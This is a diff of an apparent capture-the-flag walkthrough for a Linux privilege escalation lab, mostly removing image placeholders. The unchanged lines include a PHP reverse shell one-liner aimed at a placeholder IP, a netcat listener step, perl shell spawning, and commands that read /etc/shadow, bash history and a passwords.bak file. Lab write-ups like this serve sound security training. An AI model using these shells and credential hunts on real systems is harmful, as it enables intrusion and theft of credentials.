@@ -26,8 +26,6 @@ php -r ‘$sock=fsockopen(“YOUR-IP”,1234);exec(“/bin/sh -i <&3 >&3 2>&3”
 Then go to your command line and open a netcat listener on the port you set for the php payload.
 Image for post
 Run the the reverse shell and we have got in and we have now access as the manager.
-Image for post
-Image for post
 
 Unit 1: TTY
 
@@ -35,7 +33,7 @@ We learn about upgrading your netcat shell as sudo and su as it requires so to p
 How would you execute /bin/bash with perl?
 Answer: perl -e ‘exec “/bin/bash”;’
 Can be found online. I used GTFOBins.
-Image for post
+
 Unit 1: SSH
 We learn about getting access to a box via SSH which comes from ssh-keygen
 
@@ -63,13 +61,13 @@ Here we need to go the home directory of manager and use the cat/less command an
 cat ~/.bash_history
 A: ;)
 
-Image for post
+
 Unit 3 — /etc
 In this section we learn about: cat /etc/passwd& cat /etc/shadow
 
 Q: Can you read /etc/passwd on the box? (yay/nay)
 We can try to use the command cat /etc/passwd and see.
-Image for post
+
 A: Yay
 
 Unit 4 — Find command and interesting files
@@ -78,16 +76,15 @@ With -type f we limit the search to files only and -name allows us to search for
 
 Q: What’s the password you found?
 To find the password we can look at the picture in the room for what command is used, combined with the hint that it could be in some interesting files like .log, .conf and .bak files.
-Image for post
+
 To find the password I used the command:
 find -type f -name “*.bak” 2>/dev/null
-Image for post
+
 Here we find a interesting directory with a name passwords.bak. Using the command:
 cat /var/opt/passwords.bak
 We get the password.
 
 Answer: ;)
-Image for post
 
 Q: Did you find a flag?
 To find the flag we can use the same commands only to search for a file called flag.conf as it ask to find a flag and the hint said it could be in a .conf file
